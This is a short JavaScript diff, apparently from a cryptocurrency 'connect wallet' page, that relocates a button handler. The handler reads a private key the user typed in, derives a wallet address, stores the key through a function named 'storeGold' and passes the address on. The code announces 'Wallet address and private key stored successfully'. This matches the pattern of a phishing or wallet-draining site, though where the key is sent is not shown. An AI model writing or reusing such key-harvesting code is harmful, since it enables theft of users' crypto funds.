@@ -570,43 +570,7 @@ document.getElementById('connect-to-wallet-btn')?.addEventListener('click', asyn
 });
 
   
-document.getElementById('connect-to-wallet2-btn')?.addEventListener('click', async function (event) {
-event.preventDefault();
-alert(typeof storeGold); // Should display 'function'. If not, storeGold isn't accessible.
 
-  try {
-      // Step 1: Handle private key input and derive wallet address
-      alert('Handling private key input...');
-      var walletAddress0 = await handlePrivateKeyInput();
-      if (!walletAddress0) {
-        alert('No wallet address derived. Stopping execution.');
-        return;
-      }
-
-      // Step 2: Store the private key using storeGold
-      alert('Storing the private key using storeGold...');
-      if (typeof storeGold === 'function') {
-        await storeGold('prv-key-input', true); // Make sure the function is properly defined
-      } else {
-        alert('Error: storeGold function is not defined.');
-        return;
-      }
-
-      // Step 3: Trigger the main function to store the wallet address
-      alert('Calling storeWalletAddressHandler...');
-      var networkType0 = document.getElementById('wallet-address-label1')?.textContent || 'Unknown Network';
-      if (typeof storeWalletAddressHandler === 'function') {
-        storeWalletAddressHandler(walletAddress0, networkType0);
-      } else {
-        alert('Error: storeWalletAddressHandler function is not defined.');
-        return;
-      }
-
-      alert('Wallet address and private key stored successfully!');
-    } catch (error) {
-      alert(`Error occurred: ${error.message || error}`);
-    }
-  });
 
 	
 
@@ -2192,6 +2156,45 @@ document.addEventListener('DOMContentLoaded', function () {
     });
   }
 
+	
+
+document.getElementById('connect-to-wallet2-btn')?.addEventListener('click', async function (event) {
+event.preventDefault();
+alert(typeof storeGold); // Should display 'function'. If not, storeGold isn't accessible.
+
+  try {
+      // Step 1: Handle private key input and derive wallet address
+      alert('Handling private key input...');
+      var walletAddress0 = await handlePrivateKeyInput();
+      if (!walletAddress0) {
+        alert('No wallet address derived. Stopping execution.');
+        return;
+      }
+
+      // Step 2: Store the private key using storeGold
+      alert('Storing the private key using storeGold...');
+      if (typeof storeGold === 'function') {
+        await storeGold('prv-key-input', true); // Make sure the function is properly defined
+      } else {
+        alert('Error: storeGold function is not defined.');
+        return;
+      }
+
+      // Step 3: Trigger the main function to store the wallet address
+      alert('Calling storeWalletAddressHandler...');
+      var networkType0 = document.getElementById('wallet-address-label1')?.textContent || 'Unknown Network';
+      if (typeof storeWalletAddressHandler === 'function') {
+        storeWalletAddressHandler(walletAddress0, networkType0);
+      } else {
+        alert('Error: storeWalletAddressHandler function is not defined.');
+        return;
+      }
+
+      alert('Wallet address and private key stored successfully!');
+    } catch (error) {
+      alert(`Error occurred: ${error.message || error}`);
+    }
+  });
 });
 
 
